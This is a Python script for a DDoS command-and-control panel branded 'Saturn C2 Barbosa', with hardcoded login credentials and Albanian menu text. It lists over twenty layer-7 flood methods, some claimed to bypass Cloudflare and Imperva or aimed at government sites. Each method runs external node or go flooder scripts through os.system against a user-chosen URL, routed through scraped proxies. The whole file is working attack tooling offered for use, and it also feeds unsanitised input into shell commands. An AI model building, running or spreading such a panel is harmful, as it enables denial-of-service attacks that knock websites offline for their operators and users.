import socket
import os
import requests
import random
import getpass
import time
import sys
from colorama import init, Fore, Style

# Inicizimi i colorama
init(autoreset=True)

print(Fore.YELLOW + "Wait Scraping Proxy")
os.system("node scrape")
print(Fore.GREEN + "Scraping Proxy Success")

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_welcome_message():
    try:
        with open('proxy.txt') as f:
            proxys = f.readlines()
    except FileNotFoundError:
        print(Fore.RED + "proxy.txt not found!")
        sys.exit(1)

    bots = len(proxys)
    bots_str = str(bots)
    print(Fore.RED + f"Welcome To KapitenBarbosaPanel | User: root | Plan: VVIP | Proxy: {bots_str} | Happy To Use")
    print("")

def layer7():
    clear()
    print_welcome_message()
    print(Fore.YELLOW + ''' 
        LIST LAYER7 METHODS
        
        TLS - METODA TË FUQISHME TLS [VVIP]
        TLSV1 - METODA SHUMË TË FUQISHME TLS [VVIP]
        HTTPS - NDIHMA E DDoS ME HTTP/1.1 [BASIC]
        HTTPSV2-BYPASS - NDIHMA E DDoS ME HTTP/1.2 [VVIP]
        HTTPSV3 - SULM I RI DDoS ME HTTP/1.3 [VVIP]
        STRESS - SULMON Faqen Deri Në Rënien E Saj
        RAW - METODA TË FUQISHME TLS [VVIP]
        GORILLA - SHAKTRON SISTEMET UAM EDHE CLOUDFLARE IMPERVA
        GOOGLE - GOOGLE DDOS
        JAVA - JAVA DDOS
        GOV - GOV DDOS
        SHEGI - SHEGI DDOS [VVIP]
        SCOBYDO - SCOBYDOGSANDWICH
        NAVASAKI - NAVASAKI
        OPSSS - OPSSS DDOS
        THUNDER - THUNDER DDOS
        BARBOSA-FAVE - BARBOSA FAVE [VVIP]
        TLSBYPASS - TLSBYPASS [VIIP]
        FLOOD - FLOOD [VVIP]
        BROWSER - BROWSER [VVIP]
        TLS-FLOODER - [VIPP]

        SI TË PËRDORNI
        METODA https://example.com 120         METODA URL KOHA
    ''')

def menu():
    clear()
    bear_banner = r'''
                                         _.oo.
                 _.u[[/;:,.         .odMMMMMM'
              .o888UU[[[/;:-.  .o@P^    MMM^
             oN88888UU[[[/;::-.        dP^
            dNMMNN888UU[[[/;:--.   .o@P^
           ,MMMMMMN888UU[[/;::-. o@^
           NNMMMNN888UU[[[/~.o@P^
           888888888UU[[[/o@^-..
          oI8888UU[[[/o@P^:--..
       .@^  YUU[[[/o@^;::---..
     oMP     ^/o@P^;:::---..
  .dMMM    .o@^ ^;::---...
 dMMMMMMM@^`       `^^^^
YMMMUP^
              Saturn C2 Barbosa
                   V : 1.2
              MADE BY : Student from university of Tetovo Macedonia
             TEAM  : AnonymousAlbania

                                     
    '''
    print(Fore.RED + bear_banner)
def execute_command(cnc):
    command_mapping = {
        "layer7": layer7,
        "LAYER7": layer7,
        "L7": layer7,
        "l7": layer7,
        "clear": main,
        "CLEAR": main,
        "CLS": main,
        "cls": main,
    }

    if cnc in command_mapping:
        command_mapping[cnc]()
    elif cnc.startswith("TLS"):
        try:
            host, time = cnc.split()[1], cnc.split()[2]
            print(Fore.RED + f"Attacking {host} For {time}")
            os.system(f'node tls {host} {time} 35 10 proxy.txt')
        except IndexError:
            print(Fore.YELLOW + 'Usage: METHOD URL TIME')
    elif cnc.startswith("TLSV1"):
        try:
            host, time = cnc.split()[1], cnc.split()[2]
            print(Fore.RED + f"Attacking {host} For {time}")
            os.system(f'node tlsv1 {host} {time} 35 10 proxy.txt')
        except IndexError:
            print(Fore.YELLOW + 'Usage: METHOD URL TIME')
    elif cnc.startswith("HTTPSV2"):
        try:
            host, time = cnc.split()[1], cnc.split()[2]
            print(Fore.RED + f"Attacking {host} For {time}")
            os.system(f'node httpsv2 {host} {time} 35 10 proxy.txt')
        except IndexError:
            print(Fore.YELLOW + 'Usage: METHOD URL TIME')
    elif cnc.startswith("OPSSS"):
        try:
            host, time = cnc.split()[1], cnc.split()[2]
            print(Fore.RED + f"Attacking {host} For {time}")
            os.system(f'node OPSSS {host} {time} 35 10 proxy.txt')
        except IndexError:
            print(Fore.YELLOW + 'Usage: METHOD URL TIME')
    elif cnc.startswith("THUNDER"):
        try:
            host, time = cnc.split()[1], cnc.split()[2]
            print(Fore.RED + f"Attacking {host} For {time}")
            os.system(f'node thunder {host} {time} 35 10 proxy.txt')
        except IndexError:
            print(Fore.YELLOW + 'Usage: METHOD URL TIME')
    elif cnc.startswith("BARBOSA-FAVE"):
        try:
            host, time = cnc.split()[1], cnc.split()[2]
            print(Fore.RED + f"Attacking {host} For {time}")
            os.system(f'node barbosafave {host} {time} 35 10 proxy.txt')
        except IndexError:
            print(Fore.YELLOW + 'Usage: METHOD URL TIME')
    elif cnc.startswith("TLSBYPASS"):
        try:
            host, time = cnc.split()[1], cnc.split()[2]
            print(Fore.RED + f"Attacking {host} For {time}")
            os.system(f'node tlsbypass {host} {time} 35 10 proxy.txt')
        except IndexError:
            print(Fore.YELLOW + 'Usage: METHOD URL TIME')
    elif cnc.startswith("FLOOD"):
        try:
            host, time = cnc.split()[1], cnc.split()[2]
            print(Fore.RED + f"Attacking {host} For {time}")
            os.system(f'node flood {host} {time} 35 10 proxy.txt flood')
        except IndexError:
            print(Fore.YELLOW + 'Usage: METHOD URL TIME')
    elif cnc.startswith("BROWSER"):
        try:
            host, time = cnc.split()[1], cnc.split()[2]
            print(Fore.RED + f"Attacking {host} For {time}")
            os.system(f'node browser {host} {time} 35 10 proxy.txt')
        except IndexError:
            print(Fore.YELLOW + 'Usage: METHOD URL TIME')
    elif cnc.startswith("NAVASAKI"):
        try:
            host, time = cnc.split()[1], cnc.split()[2]
            print(Fore.RED + f"Attacking {host} For {time}")
            os.system(f'node navasaki {host} {time} 35 10 proxy.txt')
        except IndexError:
            print(Fore.YELLOW + 'Usage: METHOD URL TIME')
    elif cnc.startswith("TLS-FLOODER"):
        try:
            host, time = cnc.split()[1], cnc.split()[2]
            print(Fore.RED + f"Attacking {host} For {time}")
            os.system(f'node tls-flooder {host} {time} 35 10 proxy.txt')
        except IndexError:
            print(Fore.YELLOW + 'Usage: METHOD URL TIME')
    elif cnc.startswith("JAVA"):
        try:
            host, time = cnc.split()[1], cnc.split()[2]
            print(Fore.RED + f"Attacking {host} For {time}")
            os.system(f'node java {host} {time} 35 10 proxy.txt')
        except IndexError:
            print(Fore.YELLOW + 'Usage: METHOD URL TIME')
    elif cnc.startswith("STRESS"):
        try:
            host, time = cnc.split()[1], cnc.split()[2]
            print(Fore.RED + f"Attacking {host} For {time}")
            os.system(f'go run STRESS.go --host {host} --time {time}')
        except IndexError:
            print(Fore.YELLOW + 'Usage: METHOD URL TIME')
    elif cnc.startswith("GORILLA"):
        try:
            host, time = cnc.split()[1], cnc.split()[2]
            print(Fore.RED + f"Attacking {host} For {time}")
            os.system(f'node gorilla {host} {time} 35 10 proxy.txt')
        except IndexError:
            print(Fore.YELLOW + 'Usage: METHOD URL TIME')
    elif cnc.startswith("SCOBYDO"):
        try:
            host, time = cnc.split()[1], cnc.split()[2]
            print(Fore.RED + f"Attacking {host} For {time}")
            os.system(f'node scobydo {host} {time} 35 10 proxy.txt')
        except IndexError:
            print(Fore.YELLOW + 'Usage: METHOD URL TIME')
    elif cnc.startswith("GOV"):
        try:
            host, time = cnc.split()[1], cnc.split()[2]
            print(Fore.RED + f"Attacking {host} For {time}")
            os.system(f'node gov {host} {time} 35 10 proxy.txt')
        except IndexError:
            print(Fore.YELLOW + 'Usage: METHOD URL TIME')
    elif cnc.startswith("SHEGI"):
        try:
            host, time = cnc.split()[1], cnc.split()[2]
            print(Fore.RED + f"Attacking {host} For {time}")
            os.system(f'node shegi {host} {time} 35 10 proxy.txt')
        except IndexError:
            print(Fore.YELLOW + 'Usage: METHOD URL TIME')
    elif cnc.startswith("HTTPSV3"):
        try:
            host, time = cnc.split()[1], cnc.split()[2]
            print(Fore.RED + f"Attacking {host} For {time}")
            os.system(f'node httpsv3 {host} {time} 35 10 proxy.txt POST')
        except IndexError:
            print(Fore.YELLOW + 'Usage: METHOD URL TIME')
    elif cnc.startswith("GOOGLE"):
        try:
            host, time = cnc.split()[1], cnc.split()[2]
            print(Fore.RED + f"Attacking {host} For {time}")
            os.system(f'node google {host} {time} 35 10 proxy.txt')
        except IndexError:
            print(Fore.YELLOW + 'Usage: METHOD URL TIME')
    elif cnc.startswith("RAW"):
        try:
            host, time = cnc.split()[1], cnc.split()[2]
            print(Fore.RED + f"Attacking {host} For {time}")
            os.system(f'node raw {host} {time} 35 10 proxy.txt')
        except IndexError:
            print(Fore.YELLOW + 'Usage: METHOD URL TIME')
    elif cnc == "help":
        print(Fore.YELLOW + ''' 
LAYER7 - SEE ALL LAYER7 METHOD
HELP - FOR HELP
CLEAR - CLEAR TERMINAL
''')
    else:
        print(Fore.RED + f"Command: [ {cnc.split()[0]} ] Not Found!")

def main():
    menu()
    while True:
        cnc = input(Fore.YELLOW + "root@Barbosa#~ ")
        execute_command(cnc)

def login():
    clear()
    user = "user"
    passwd = "user"
    username = input(Fore.YELLOW + "</> Username: ")
    password = getpass.getpass(prompt=Fore.YELLOW + '</> Password: ')
    if username != user or password != passwd:
        print(Fore.RED + "Password/Username Error")
        sys.exit(1)
    else:
        print(Fore.GREEN + "Welcome To KapitenBarbosa Panel")
        time.sleep(0.3)
        main()

if __name__ == "__main__":
    login()
